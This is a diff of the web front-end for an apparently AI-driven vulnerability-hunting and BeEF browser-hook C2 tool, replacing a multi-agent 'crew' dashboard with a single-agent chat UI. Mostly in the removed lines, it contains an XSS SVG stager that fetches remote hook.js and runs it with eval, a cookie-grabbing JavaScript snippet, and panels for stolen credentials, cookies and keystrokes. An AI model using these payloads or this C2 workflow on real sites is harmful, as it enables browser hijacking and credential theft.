-      <button onclick="sendCmd('Oi crew! Sound off with station status and roast whoever is slacking!', '', true)">🍻 Crew Roll-Call &amp; Banter</button>
-      <button onclick="sendCmd('RAZOR who copped the worst brown-eye today and why?', '', true)">🍑 Brown-Eye Report</button>
-      <button onclick="sendCmd('What is our WAF & tamper strategy on this target boys?', '', true)">🛡️ WAF Strategy</button>
-      <button onclick="openVictimAndSwitch()">🪝 Hook Demo Victim Browser</button>
-      <button onclick="sendCmd('/status', '', true)">📊 Status Summary</button>
-    </div>
-    <form class="composer" onsubmit="onSubmitChat(event)">
-      <select id="speakerSelect">
-        <option value="">@CREW (Group Banter)</option>
-        <option value="GHOST">@GHOST (Recon)</option>
-        <option value="BLITZ">@BLITZ (Hunter)</option>
-        <option value="SWITCH">@SWITCH (Escalator)</option>
-        <option value="RAZOR">@RAZOR (Critic)</option>
-        <option value="CHAINSAW">@CHAINSAW (Chains)</option>
-        <option value="FIXER">@FIXER (Reporter)</option>
-      </select>
-      <input id="chatInput" placeholder="Banter with the whole crew, @mention an operator, drop a URL, or run /autopilot..." autocomplete="off" />
-      <button class="primary" type="submit">Send</button>
-    </form>
+    <div class="target-hint" id="targetHint">No target set</div>
   </div>
 
-  <div class="col">
-    <div class="tabs">
-      <button id="rtab-wire" class="active" onclick="setRightTab('wire')">⚡ Live Feed</button>
-      <button id="rtab-ver" onclick="setRightTab('ver')">✅ Bugs (<span id="cntV">0</span>)</button>
-      <button id="rtab-dis" onclick="setRightTab('dis')">🍑 Binned (<span id="cntD">0</span>)</button>
-      <button id="rtab-chn" onclick="setRightTab('chn')">⛓️ Chains (<span id="cntC">0</span>)</button>
-    </div>
-    <div class="scroll" id="rightPane"></div>
-  </div>
-</div>
-
-<!-- ==================== WORKSPACE 2: LIVE AGENT STATS & PROCESS MATRIX ==================== -->
-<div class="workspace" id="view-ops">
-  <div class="ops-cards" id="opsAgentGrid"></div>
-  <div class="ops-mid">
-    <div class="ops-box">
-      <div class="pane-head"><span>Active &amp; Recent `.bin/` Subprocess Executions</span><span id="procSummary"></span></div>
-      <div class="scroll" id="procPane" style="padding:8px"></div>
-    </div>
-    <div class="ops-box">
-      <div class="pane-head"><span>`PAYLOAD_MUTEX` WAF Evasion &amp; Tamper State</span></div>
-      <div class="scroll" id="wafPane" style="padding:10px;font-size:11.5px"></div>
-    </div>
-  </div>
-  <div style="flex:1;min-height:260px;margin:0 12px 12px;background:var(--panel);border:1px solid var(--border);border-radius:8px;display:flex;flex-direction:column">
-    <div class="pane-head">
-      <span>Real-Time HTTP Wire, `.bin/` Binary, WAF &amp; Critic Telemetry Stream</span>
-      <div style="display:flex;gap:5px">
-        <button onclick="setWireFilter('ALL')" id="wf-ALL" class="primary" style="padding:3px 8px;font-size:10px">ALL</button>
-        <button onclick="setWireFilter('process')" id="wf-process" style="padding:3px 8px;font-size:10px">.BIN PROC</button>
-        <button onclick="setWireFilter('http')" id="wf-http" style="padding:3px 8px;font-size:10px">HTTP WIRE</button>
-        <button onclick="setWireFilter('waf')" id="wf-waf" style="padding:3px 8px;font-size:10px">WAF MUTEX</button>
-        <button onclick="setWireFilter('critic')" id="wf-critic" style="padding:3px 8px;font-size:10px">RAZOR</button>
-        <button onclick="setWireFilter('c2')" id="wf-c2" style="padding:3px 8px;font-size:10px">BeEF / OOB</button>
-      </div>
-    </div>
-    <div class="scroll" id="opsWirePane" style="padding:0"></div>
-  </div>
-</div>
-
-<!-- ==================== WORKSPACE 3: BeEF BROWSER C2 & OOB WORKBENCH ==================== -->
-<div class="workspace" id="view-beef">
-  <div class="col">
-    <div class="pane-head">
-      <span>Hooked Browsers &amp; Attack Modules</span>
-      <button class="success" style="padding:3px 8px;font-size:10px" onclick="spawnDemoVictim()">🪝 Hook Demo Victim</button>
-    </div>
-    <div class="scroll">
-      <div style="font-size:10.5px;color:var(--muted);margin-bottom:6px">HOOKED ZOMBIE BROWSERS (click to select target):</div>
-      <div id="beefSessions"></div>
-      <div style="margin:12px 0 6px;padding-top:10px;border-top:1px solid var(--border);font-size:10.5px;color:var(--cyan);font-weight:700">
-        1-CLICK EXPLOITATION MODULES:
-      </div>
-      <div id="beefModules"></div>
-    </div>
+  <div class="sb-section">
+    <label class="sb-label">Actions</label>
+    <button class="action" onclick="run('/recon')"><span>🔎</span><div><b>Recon</b><small>map everything about the target</small></div></button>
+    <button class="action" onclick="run('/hunt')"><span>🎯</span><div><b>Hunt</b><small>find vulnerabilities</small></div></button>
+    <button class="action accent" onclick="run('/auto')"><span>⚡</span><div><b>Auto</b><small>recon → hunt → pursue each bug</small></div></button>
   </div>
 
-  <div class="col">
-    <div class="pane-head">
-      <span>BeEF C2 JS Console, Execution Output, Loot Vault &amp; OOB Listener</span>
-      <button class="warn" style="padding:3px 8px;font-size:10px" onclick="mintAndTestOob()">📡 Mint + Test OOB Callback</button>
-    </div>
-    <div class="scroll">
-      <div class="finding" style="border-left:3px solid var(--cyan)">
-        <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap">
-          <strong>Live Browser Hook Stagers (`hook.js`)</strong>
-          <div style="display:flex;gap:5px">
-            <button onclick="copyHookUrl()" style="padding:3px 8px;font-size:10px">Copy hook.js URL</button>
-            <button onclick="copySvgStager()" style="padding:3px 8px;font-size:10px">Copy WAF-Bypass SVG Stager</button>
-          </div>
-        </div>
-        <pre class="code" id="hookUrlBox"></pre>
-      </div>
-
-      <div class="finding">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
-          <strong>Execute Custom JavaScript on <span id="targetSidLabel" style="color:var(--cyan)">* ALL HOOKED BROWSERS</span></strong>
-          <button class="primary" onclick="runCustomBeefJs()" style="padding:4px 10px">⚡ Execute JS</button>
-        </div>
-        <textarea id="customJsBox" rows="3" style="width:100%">({title: document.title, cookies: document.cookie, userAgent: navigator.userAgent})</textarea>
-      </div>
-
-      <div style="font-size:11px;font-weight:700;color:var(--green);margin:10px 0 6px">💎 CAPTURED LOOT VAULT (Phished Creds, Cookies, DOM Tokens &amp; Keystrokes):</div>
-      <div id="beefLootPane"></div>
-
-      <div style="font-size:11px;font-weight:700;color:var(--cyan);margin:12px 0 6px">📜 COMMAND EXECUTION RESULTS:</div>
-      <div id="beefResultsPane"></div>
-
-      <div style="font-size:11px;font-weight:700;color:var(--magenta);margin:12px 0 6px">📡 OUT-OF-BAND (`OOBManager` / `Interactsh`) CALLBACK HITS:</div>
-      <div id="oobHitsPane"></div>
-    </div>
+  <div class="sb-section grow">
+    <label class="sb-label">Stages <span id="stageProgress">0/6</span></label>
+    <div id="stageList"></div>
   </div>
 
-  <div class="col">
-    <div class="pane-head">
-      <span>Live Victim Browser Sandbox (`beef/victim`)</span>
-      <div style="display:flex;gap:5px">
-        <button onclick="spawnDemoVictim()" style="padding:3px 7px;font-size:10px">Reload Victim</button>
-        <a href="beef/victim" target="_blank" style="color:var(--cyan);font-size:10.5px;text-decoration:none;padding:3px 6px">Pop Out ↗</a>
-      </div>
-    </div>
-    <iframe id="victimFrame" src="about:blank" style="flex:1;border:none;background:#0f172a;width:100%"></iframe>
+  <div class="sb-section">
+    <div class="mini-kpis" id="miniKpis"></div>
   </div>
-</div>
 
-<!-- ==================== WORKSPACE 4: ADVISORIES, POCS, CHAINS & 22 TOOLS ==================== -->
-<div class="workspace" id="view-findings">
-  <div class="col">
-    <div class="pane-head"><span>22 `.bin/` &amp; Built-In Arsenal Status</span></div>
-    <div class="scroll" id="arsenalList"></div>
+  <div class="sb-foot">
+    <button class="ghost" onclick="openPanel('ops')">Live ops</button>
+    <button class="ghost" onclick="openPanel('findings')">Findings</button>
+    <button class="ghost" onclick="openPanel('beef')">BeEF</button>
+    <button class="ghost" onclick="openPanel('arsenal')">Arsenal</button>
+    <button class="ghost" onclick="openPanel('keys')">API key</button>
+    <button class="ghost" onclick="openPanel('about')">Help</button>
   </div>
-  <div class="col">
-    <div class="pane-head"><span>Full Verified Advisories, Reproducible `curl` PoCs, Attack Chains &amp; Binned False Positives</span></div>
-    <div class="scroll" id="fullFindingsPane"></div>
+</aside>
+
+<main class="main">
+  <header class="topbar">
+    <button class="icon-btn menu-btn" onclick="toggleSidebar()">☰</button>
+    <div class="topbar-title">#basement-ops <span class="pill" id="agentState">idle</span></div>
+    <div class="topbar-right">
+      <span class="chip">HTTP <b id="kHttp">0</b></span>
+      <span class="chip">.bin <b id="kBin">0</b></span>
+      <span class="chip">WAF <b id="kWaf">0</b></span>
+      <span class="chip green">verified <b id="kVer">0</b></span>
+      <span class="chip red">disproved <b id="kDis">0</b></span>
+      <span class="chip" id="llmBadge">…</span>
+    </div>
+  </header>
+
+  <div class="scroll" id="chatScroll">
+    <div class="thread" id="chatThread"></div>
+  </div>
+
+  <div class="composer">
+    <div class="chips">
+      <button onclick="run('/target')">/target &lt;site.com&gt;</button>
+      <button onclick="run('/recon')">/recon</button>
+      <button onclick="run('/hunt')">/hunt</button>
+      <button onclick="run('/auto')">/auto</button>
+      <button onclick="run('/verify')">/verify</button>
+      <button onclick="run('/chains')">/chains</button>
+      <button onclick="run('/report')">/report</button>
+      <button onclick="run('/status')">/status</button>
+      <button onclick="run('/lab')">/lab</button>
+    </div>
+    <div class="input-wrap">
+      <textarea id="chatInput" rows="1" placeholder="Message the agent…   e.g. /target example.com  then  /auto"></textarea>
+      <button class="send" id="sendBtn" onclick="send()">➤</button>
+    </div>
+    <div class="composer-foot">Enter to send · Shift+Enter for a new line · every bug is verified before it reaches the report</div>
+  </div>
+</main>
+
+<div class="backdrop" id="backdrop" onclick="closeSidebarOrPanel()"></div>
+<div class="panel" id="panel">
+  <div class="panel-head"><span id="panelTitle">Panel</span><button class="icon-btn" onclick="closePanel()">✕</button></div>
+  <div class="panel-body" id="panelBody"></div>
+  <div id="victimHolder">
+    <div class="victim-head"><span>Victim browser sandbox</span><button class="icon-btn" onclick="spawnVictim()" title="Reload victim">⟳</button></div>
+    <iframe id="victimFrame" src="about:blank"></iframe>
   </div>
 </div>
 
 <script>
-const COLORS = {
-  GHOST: '#28d7ff', BLITZ: '#ff4769', SWITCH: '#c77dff',
-  RAZOR: '#ffd166', CHAINSAW: '#2be89a', FIXER: '#5fa8ff', YOU: '#ffffff'
+const AGENT_COLOR = '#28d7ff';
+const COLORS = { AGENT: AGENT_COLOR, SYSTEM: '#8e8ea0', YOU: '#ffffff' };
+const KIND_LABEL = {
+  operator: 'you', info: 'agent', stage: 'stage', verified: 'verified',
+  disproved: 'disproved', warn: 'warning', error: 'error', waf: 'waf'
 };
 
 let state = null;
@@ -420,364 +424,516 @@ let lastEventSeq = 0;
 let pollInFlight = false;
 let pollTimer = null;
 let toolsCache = [];
-let activeView = 'chat';
-let rightTab = 'wire';
-let wireFilter = 'ALL';
+let panel = '';
 let selectedSid = '*';
-let lastTranscriptSig = '';
+let lastThreadSig = '';
+let lastPanelSig = '';
+
+const $ = id => document.getElementById(id);
 
 function esc(s) {
-  return String(s ?? '').replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+  return String(s ?? '').replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]));
+}
+
+function md(text) {
+  const parts = String(text ?? '').split('```');
+  return parts.map((part, i) => {
+    if (i % 2 === 1) {
+      const body = part.replace(/^[a-zA-Z0-9]*\n/, '').replace(/\s+$/, '');
+      return `<pre class="code">${esc(body)}</pre>`;
+    }
+    let h = esc(part);
+    h = h.replace(/`([^`\n]+)`/g, '<code>$1</code>');
+    h = h.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+    h = h.replace(/(https?:\/\/[^\s<)]+)/g, '<a href="$1" target="_blank" rel="noopener">$1</a>');
+    return h.replace(/\n/g, '<br>');
+  }).join('');
 }
 
 async function api(url, opts = {}) {
-  const res = await fetch(url, Object.assign({credentials: 'same-origin'}, opts));
+  const res = await fetch(url, Object.assign({ credentials: 'same-origin' }, opts));
   if (!res.ok) throw new Error('HTTP ' + res.status);
   return res.json();
 }
 
-function publicHookUrl() {
-  const base = window.location.href.split('?')[0].split('#')[0].replace(/\/+$/, '');
-  return base + '/beef/hook.js';
+/* ---------------- layout ---------------- */
+function toggleSidebar() { document.body.classList.toggle('sb-open'); }
+function closeSidebarOrPanel() { document.body.classList.remove('sb-open'); closePanel(); }
+
+function openPanel(name) {
+  panel = name;
+  const titles = { ops: 'Live operations', findings: 'Findings, chains & PoCs', beef: 'BeEF hook C2 & OOB', arsenal: 'Arsenal status', keys: 'LLM / API key', about: 'How to drive the agent' };
+  $('panelTitle').textContent = titles[name] || name;
+  $('panel').classList.add('show');
+  $('backdrop').classList.add('show');
+  lastPanelSig = '';
+  document.body.classList.remove('sb-open');
+  $('victimHolder').classList.toggle('show', name === 'beef');
+  if (state) renderPanel();
+  if (name === 'beef') spawnVictim();
+}
+function closePanel() {
+  panel = '';
+  $('panel').classList.remove('show');
+  $('backdrop').classList.remove('show');
+  $('victimHolder').classList.remove('show');
 }
 
-function switchView(v) {
-  activeView = v;
-  document.querySelectorAll('.workspace').forEach(el => el.classList.remove('active'));
-  document.querySelectorAll('.view-tabs button').forEach(el => el.classList.remove('active'));
-  document.getElementById('view-' + v).classList.add('active');
-  document.getElementById('tab-' + v).classList.add('active');
-  if (state) render();
-}
-
-function setRightTab(t) {
-  rightTab = t;
-  ['wire','ver','dis','chn'].forEach(k => document.getElementById('rtab-' + k).classList.toggle('active', k === t));
-  if (state) renderRight();
-}
-
-function setWireFilter(f) {
-  wireFilter = f;
-  ['ALL','process','http','waf','critic','c2'].forEach(k => {
-    const b = document.getElementById('wf-' + k);
-    if (b) b.classList.toggle('primary', k === f);
-  });
-  if (state) renderOps();
-}
-
-function selectCrew(handle) {
-  const sel = document.getElementById('speakerSelect');
-  sel.value = (sel.value === handle ? '' : handle);
-  document.getElementById('chatInput').focus();
-  renderCrew();
-}
-
-function openVictimAndSwitch() {
-  switchView('beef');
-  spawnDemoVictim();
-}
-
-function spawnDemoVictim() {
-  const fr = document.getElementById('victimFrame');
-  fr.src = 'beef/victim?t=' + Date.now();
-}
-
-async function runBeefModule(modId, label, jsCode) {
-  const fr = document.getElementById('victimFrame');
-  if (!state?.beef?.sessions_list?.length && fr && fr.src === 'about:blank') {
-    spawnDemoVictim();
-    await new Promise(r => setTimeout(r, 900));
+/* ---------------- actions ---------------- */
+async function sendMessage(message) {
+  if (!message || !message.trim()) return;
+  try {
+    await api('api/chat', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message, async: true })
+    });
+  } catch (e) {
+    addLocalError('Could not reach the agent: ' + e.message);
   }
-  await api('api/beef/command', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({sid: selectedSid, module: modId, label, js: jsCode})
-  });
-  setTimeout(refreshState, 450);
-  setTimeout(refreshState, 1350);
+  await refreshState();
 }
 
-async function runCustomBeefJs() {
-  const js = document.getElementById('customJsBox').value.trim();
-  if (!js) return;
-  await runBeefModule('custom_js', 'Custom JS eval()', js);
+function run(cmd) {
+  if (cmd === '/target') { $('targetInput').focus(); return; }
+  sendMessage(cmd);
 }
 
-async function mintAndTestOob() {
-  const out = await api('api/oob/test', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: '{}'});
-  if (out.canary) await refreshState();
+function send() {
+  const inp = $('chatInput');
+  const msg = inp.value.trim();
+  if (!msg) return;
+  inp.value = '';
+  autoGrow();
+  sendMessage(msg);
 }
 
-function copyHookUrl() {
-  navigator.clipboard?.writeText(publicHookUrl());
-}
-function copySvgStager() {
-  navigator.clipboard?.writeText(`"><svg/onload="fetch('${publicHookUrl()}').then(r=>r.text()).then(eval)">`);
-}
-
-function renderCrew() {
-  const cur = document.getElementById('speakerSelect').value;
-  document.getElementById('crewList').innerHTML = (state.crew || []).map(c => {
-    const s = c.stats || {};
-    const st = s.state || 'IDLE';
-    return `
-      <div class="crew-card ${cur === c.handle ? 'active' : ''} ${st === 'RUNNING' ? 'running' : ''}" onclick="selectCrew('${c.handle}')">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <span style="color:${COLORS[c.handle] || '#fff'};font-weight:800;font-size:12.5px">@${c.handle}</span>
-          <span class="state-chip ${st}">${esc(s.current_tool || st)}</span>
-        </div>
-        <div style="color:var(--muted);font-size:10px;margin-top:2px">${esc(c.role)}</div>
-        <div class="task-line" title="${esc(s.current_task || '')}">${esc(s.current_task || 'Standing by')}</div>
-        <div class="mini-stats">
-          <div>HTTP<b>${s.http_requests || 0}</b></div>
-          <div>.bin<b>${s.bin_runs || 0}</b></div>
-          <div>WAF<b>${s.waf_bypasses || 0}/${s.waf_blocks || 0}</b></div>
-          <div>Win/Bin<b>${(s.verified_wins || s.leads_found || s.escalations || 0)}/${s.browneyes || 0}</b></div>
-        </div>
-      </div>`;
-  }).join('');
+async function setTarget() {
+  const v = $('targetInput').value.trim();
+  if (!v) return;
+  await sendMessage('/target ' + v);
 }
 
-function renderChat() {
-  const feed = document.getElementById('chatFeed');
-  const msgs = state.transcript || [];
-  const sig = msgs.length + ':' + (msgs.length ? msgs[msgs.length - 1].ts + msgs[msgs.length - 1].text : '');
-  if (sig === lastTranscriptSig) return;
-  const nearBottom = (feed.scrollHeight - feed.scrollTop - feed.clientHeight) < 140;
-  lastTranscriptSig = sig;
-  feed.innerHTML = msgs.map(m => {
-    const col = COLORS[m.speaker] || '#e6eef8';
-    const arrow = m.to ? `<span style="color:var(--muted)">→ ${esc(m.to)}</span>` : '';
-    return `
-      <div class="msg ${esc(m.kind || 'banter')}">
-        <div class="msg-head">
-          <strong style="color:${col}">${esc(m.speaker)}</strong>
-          ${arrow}
-          <span class="badge">${esc(m.kind || 'crew')}</span>
-          <span style="margin-left:auto;color:var(--muted);font-size:9.5px">${new Date((m.ts || 0)*1000).toLocaleTimeString()}</span>
-        </div>
-        <div>${esc(m.text)}</div>
-      </div>`;
-  }).join('');
-  if (nearBottom || msgs.length <= 6) feed.scrollTop = feed.scrollHeight;
+async function newChat() {
+  try { await api('api/reset', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' }); } catch (e) {}
+  lastThreadSig = '';
+  lastPanelSig = '';
+  await refreshState();
+  closePanel();
+  document.body.classList.remove('sb-open');
 }
 
-function renderRight() {
-  const pane = document.getElementById('rightPane');
-  if (rightTab === 'wire') {
-    const evs = [...((state.telemetry && state.telemetry.events) || [])].reverse().slice(0, 75);
-    pane.innerHTML = evs.length ? evs.map(e => `
-      <div class="ev-row ${esc(e.level)}">
-        <span class="ev-cat">${esc(e.category)}</span>
-        <div style="min-width:0;flex:1">
-          <div><strong style="color:${COLORS[e.agent] || 'var(--cyan)'}">${esc(e.agent)}</strong> ${esc(e.title)}</div>
-          ${e.detail ? `<div style="color:var(--muted);font-size:9.8px;overflow:hidden;text-overflow:ellipsis">${esc(e.detail)}</div>` : ''}
-        </div>
-      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No wire activity yet — click Launch Lab or 6-Agent Autopilot!</p>';
-  } else if (rightTab === 'ver') {
-    pane.innerHTML = (state.verified || []).length ? state.verified.map(f => `
-      <div class="finding ${esc(f.severity)}">
-        <div style="display:flex;justify-content:space-between">
-          <strong style="color:var(--green)">[${esc((f.severity || '').toUpperCase())}] ${esc(f.type)}</strong>
-          <span>CVSS ${esc(f.cvss_score || '')}</span>
-        </div>
-        <div style="color:var(--cyan);margin-top:3px;word-break:break-all">${esc(f.url)}</div>
-        <div style="color:var(--muted);font-size:10.5px;margin-top:4px">${esc(f.evidence)}</div>
-        ${f.curl_poc ? `<pre class="code">${esc(f.curl_poc)}</pre>` : ''}
-      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No RAZOR-certified bugs yet.</p>';
-  } else if (rightTab === 'dis') {
-    pane.innerHTML = (state.disproved || []).length ? state.disproved.map(f => `
-      <div class="finding disproved">
-        <strong style="color:var(--red)">🍑 BINNED BY RAZOR :: ${esc(f.type)}</strong>
-        <div style="color:var(--muted);margin-top:3px;word-break:break-all">${esc(f.url)}</div>
-        <div style="color:#ffb3c1;font-size:10.5px;margin-top:4px">${esc((f.critic_notes || []).join(' | '))}</div>
-      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No false-positive mirages binned yet.</p>';
-  } else {
-    pane.innerHTML = (state.chains || []).length ? state.chains.map(c => `
-      <div class="finding critical">
-        <strong style="color:var(--magenta)">⛓️ ${esc(c.title || c.name)}</strong>
-        <div style="color:var(--yellow);font-size:10.5px;margin-top:3px">Impact: ${esc(c.impact || c.severity)}</div>
-        <pre class="code">${esc((c.steps || []).join('\n→ '))}</pre>
-      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No attack chains built yet.</p>';
-  }
+function addLocalError(text) {
+  const thread = $('chatThread');
+  thread.insertAdjacentHTML('beforeend',
+    `<div class="msg-row"><div class="avatar agent">!</div><div class="bubble-col"><div class="bubble error">${esc(text)}</div></div></div>`);
+  scrollToBottom(true);
 }
 
-function renderOps() {
-  if (activeView !== 'ops') return;
-  const t = state.telemetry || {};
-  document.getElementById('opsAgentGrid').innerHTML = (state.crew || []).map(c => {
-    const s = c.stats || {};
-    return `
-      <div class="ops-card" style="border-top:3px solid ${COLORS[c.handle] || '#fff'}">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <strong style="color:${COLORS[c.handle]};font-size:14px">${c.handle} — ${esc(c.role)}</strong>
-          <span class="state-chip ${s.state || 'IDLE'}">${esc(s.state || 'IDLE')}</span>
-        </div>
-        <div style="margin-top:7px;font-size:11.5px;color:#bde0fe">Task: <b>${esc(s.current_task || 'Idle')}</b></div>
-        <div style="margin-top:3px;font-size:11px;color:var(--yellow)">Active Tool: <code>${esc(s.current_tool || 'none')}</code></div>
-        <div class="mini-stats" style="margin-top:9px">
-          <div>HTTP Reqs<b>${s.http_requests || 0}</b></div>
-          <div>.bin Runs<b>${s.bin_runs || 0}</b></div>
-          <div>WAF Wins<b>${s.waf_bypasses || 0}</b></div>
-          <div>Runtime<b>${Math.round(s.total_runtime_ms || 0)}ms</b></div>
-        </div>
-      </div>`;
-  }).join('');
+/* ---------------- composer behaviour ---------------- */
+function autoGrow() {
+  const t = $('chatInput');
+  t.style.height = 'auto';
+  t.style.height = Math.min(190, t.scrollHeight) + 'px';
+}
+$('chatInput').addEventListener('input', autoGrow);
+$('chatInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send(); }
+});
+$('targetInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') { e.preventDefault(); setTarget(); }
+});
 
-  const act = t.active_processes || [];
-  const rec = t.recent_processes || [];
-  document.getElementById('procSummary').textContent = `${act.length} running · ${rec.length} recent`;
-  document.getElementById('procPane').innerHTML = [
-    ...act.map(p => `<div class="ev-row warn"><span class="ev-cat">LIVE</span><div><b style="color:var(--yellow)">[${esc(p.agent)}]</b> <code>${esc(p.cmd)}</code> (${Math.round(p.elapsed_ms)}ms)</div></div>`),
-    ...rec.map(p => `<div class="ev-row"><span class="ev-cat">${esc(p.status)}</span><div><b style="color:${COLORS[p.agent]||'var(--cyan)'}">[${esc(p.agent)}]</b> <code>${esc(p.cmd)}</code> <span style="color:var(--muted)">(${Math.round(p.duration_ms)}ms)</span></div></div>`)
-  ].join('') || '<div style="padding:10px;color:var(--muted);font-size:11.5px">No `.bin/` subprocesses executed yet.</div>';
-
-  const wm = state.waf_mutex || {};
-  document.getElementById('wafPane').innerHTML = `<pre class="code">${esc(JSON.stringify(wm, null, 2))}</pre>`;
-
-  const allEv = [...(t.events || [])].reverse().filter(e => wireFilter === 'ALL' || e.category === wireFilter);
-  document.getElementById('opsWirePane').innerHTML = allEv.slice(0, 180).map(e => `
-    <div class="ev-row ${esc(e.level)}">
-      <span style="color:var(--muted);min-width:68px">${new Date(e.ts*1000).toLocaleTimeString()}</span>
-      <span class="ev-cat">${esc(e.category)}</span>
-      <strong style="min-width:74px;color:${COLORS[e.agent]||'var(--cyan)'}">${esc(e.agent)}</strong>
-      <span style="flex:1">${esc(e.title)} <span style="color:var(--muted)">${esc(e.detail || '')}</span></span>
-    </div>`).join('');
+/* ---------------- scroll ---------------- */
+function nearBottom() {
+  const el = $('chatScroll');
+  return (el.scrollHeight - el.scrollTop - el.clientHeight) < 160;
+}
+function scrollToBottom(force) {
+  const el = $('chatScroll');
+  if (force || nearBottom()) el.scrollTop = el.scrollHeight;
 }
 
-function renderBeef() {
-  if (activeView !== 'beef') return;
-  const b = state.beef || {};
-  document.getElementById('hookUrlBox').textContent =
-    `Browser Hook URL: ${publicHookUrl()}\nSVG WAF Bypass:  "><svg/onload="fetch('${publicHookUrl()}').then(r=>r.text()).then(eval)">`;
-  document.getElementById('targetSidLabel').textContent = selectedSid === '*' ? '* ALL HOOKED BROWSERS' : selectedSid;
-
-  const list = b.sessions_list || [];
-  document.getElementById('beefSessions').innerHTML = `
-    <div class="crew-card ${selectedSid === '*' ? 'active' : ''}" onclick="selectedSid='*';renderBeef()">
-      <strong style="color:var(--cyan)">📡 Broadcast (* All Hooked Browsers — ${list.length})</strong>
-    </div>` + (list.length ? list.map(s => {
-      const tel = s.telemetry || {};
-      return `
-      <div class="crew-card ${selectedSid === s.sid ? 'active' : ''}" onclick="selectedSid='${esc(s.sid)}';renderBeef()">
-        <div style="display:flex;justify-content:space-between">
-          <strong style="color:${s.online ? 'var(--green)' : 'var(--yellow)'}">${s.online ? '🟢' : '🟡'} ${esc(s.sid)}</strong>
-          <span style="font-size:10px;color:var(--muted)">${s.age_sec}s ago</span>
-        </div>
-        <div style="font-size:10.5px;color:#dbeafe;margin-top:3px">${esc(tel.title || tel.href || s.remote)}</div>
-        <div style="font-size:10px;color:var(--muted);margin-top:3px">Cookies: ${tel.cookie_len||0}B · Forms: ${tel.forms||0} · Inputs: ${tel.inputs||0} · ${esc(tel.screen||'')}</div>
-      </div>`;
-    }).join('') : '<div style="font-size:11px;color:var(--muted);margin-bottom:8px">No hooked browsers yet — click <b>🪝 Hook Demo Victim</b> above to hook a live session instantly!</div>');
-
-  if (!document.getElementById('beefModules').dataset.rendered && (b.modules || []).length) {
-    document.getElementById('beefModules').dataset.rendered = '1';
-    document.getElementById('beefModules').innerHTML = b.modules.map(m => `
-      <button class="mod-btn" onclick='runBeefModule(${JSON.stringify(m.id)}, ${JSON.stringify(m.name)}, ${JSON.stringify(m.js)})'>
-        <span>⚡ ${esc(m.name)} <span class="badge">${esc(m.risk)}</span></span>
-        <small>${esc(m.description)}</small>
-      </button>`).join('');
-  }
-
-  document.getElementById('beefLootPane').innerHTML = (b.loot || []).length ? b.loot.map(l => `
-    <div class="finding critical">
-      <div style="display:flex;justify-content:space-between">
-        <strong style="color:var(--green)">💎 ${esc(l.kind)} (${esc(l.sid)})</strong>
-        <span style="color:var(--muted);font-size:10px">${new Date(l.ts*1000).toLocaleTimeString()}</span>
-      </div>
-      <pre class="code">${esc(JSON.stringify(l.data, null, 2))}</pre>
-    </div>`).join('') : '<div style="color:var(--muted);font-size:11px">Run <b>Steal Cookies & Storage</b> or <b>Inject SSO Re-Auth Overlay</b> to capture live victim loot here.</div>';
-
-  document.getElementById('beefResultsPane').innerHTML = (b.command_log || []).length ? b.command_log.map(c => `
-    <div class="finding">
-      <div style="display:flex;justify-content:space-between">
-        <strong style="color:var(--cyan)">${esc(c.label)} → ${esc(c.sid)}</strong>
-        <span class="state-chip ${c.status === 'EXECUTED' ? 'DONE' : 'RUNNING'}">${esc(c.status)}</span>
-      </div>
-      ${c.output ? `<pre class="code">${esc(c.output)}</pre>` : '<div style="color:var(--muted);font-size:10.5px;margin-top:4px">Awaiting zombie browser poll...</div>'}
-    </div>`).join('') : '<div style="color:var(--muted);font-size:11px">No commands queued yet.</div>';
-
-  const oob = state.oob || {};
-  document.getElementById('oobHitsPane').innerHTML = (oob.hits || []).length ? oob.hits.map(h => `
-    <div class="finding high">
-      <strong style="color:var(--magenta)">📡 ${esc(h.method || 'HIT')} ${esc(h.path || h.token)}</strong>
-      <div style="font-size:10.5px;color:var(--muted)">Remote: ${esc(h.remote || 'remote')} · Channel: ${esc(h.channel)}</div>
-    </div>`).join('') : '<div style="color:var(--muted);font-size:11px">No OOB callbacks recorded yet.</div>';
-}
-
-function renderFindingsView() {
-  if (activeView !== 'findings') return;
-  document.getElementById('arsenalList').innerHTML = toolsCache.map(t => `
-    <div class="finding">
-      <div style="display:flex;justify-content:space-between">
-        <strong style="color:var(--cyan)">${esc(t.name)}</strong>
-        <span style="color:var(--green)">${esc(t.source)} :: ${esc(t.status)}</span>
-      </div>
-      <div style="color:var(--muted);font-size:10px;margin-top:3px">${esc(t.version || '')}</div>
-    </div>`).join('');
-
-  document.getElementById('fullFindingsPane').innerHTML = [
-    ...(state.verified || []).map(f => `
-      <div class="finding critical">
-        <div style="display:flex;justify-content:space-between">
-          <strong style="color:var(--green)">✅ VERIFIED [${esc((f.severity||'').toUpperCase())}] :: ${esc(f.type)} (CVSS ${esc(f.cvss_score||'')})</strong>
-          <span style="color:var(--muted)">Detected by ${esc(f.detected_by)} · Escalated: ${esc((f.escalated_with||[]).join(', ')||'n/a')}</span>
-        </div>
-        <div style="color:var(--cyan);margin-top:4px">${esc(f.url)} (param: <code>${esc(f.parameter||'n/a')}</code>)</div>
-        <div style="margin-top:5px">${esc(f.evidence)}</div>
-        ${f.curl_poc ? `<pre class="code">${esc(f.curl_poc)}</pre>` : ''}
-      </div>`),
-    ...(state.disproved || []).map(f => `
-      <div class="finding disproved">
